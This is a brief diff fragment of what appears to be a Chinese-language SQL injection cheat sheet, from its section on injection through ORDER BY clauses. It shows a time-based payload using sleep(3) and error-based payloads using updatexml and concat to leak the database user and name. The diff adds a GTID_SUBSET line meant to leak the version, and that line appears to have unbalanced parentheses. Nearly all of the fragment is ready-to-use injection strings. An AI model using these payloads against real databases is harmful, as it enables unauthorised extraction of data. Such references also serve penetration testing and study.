@@ -27,7 +27,9 @@ select * from users order by if(concat(0 x 7 e,user(), 0 x 7 e), 1,sleep(3));
 报错回显
 ```
 order by updatexml(1, if (1=2,1,concat(0 x 7 e,database(), 0 x 7 e)), 1);
+order by GTID_SUBSET((version(),1)))
 ```
+
 
 ^
 ## **like**
